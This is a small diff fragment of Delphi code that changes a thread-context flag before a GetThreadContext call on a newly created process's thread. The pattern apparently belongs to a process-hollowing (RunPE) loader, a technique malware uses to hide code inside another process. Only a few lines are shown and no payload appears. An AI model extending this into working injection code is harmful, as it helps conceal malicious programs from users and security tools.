@@ -173,7 +173,7 @@ begin
         begin
 
            CONT := PCONTEXT(VirtualAlloc(nil, sizeof(CONT), MEM_COMMIT, PAGE_READWRITE));
-          CONT.ContextFlags := CONTEXT_FULL;
+          CONT.ContextFlags := CONTEXT_ALL;
 
           if GetThreadContext(PI.hThread, CONT^) then
           begin
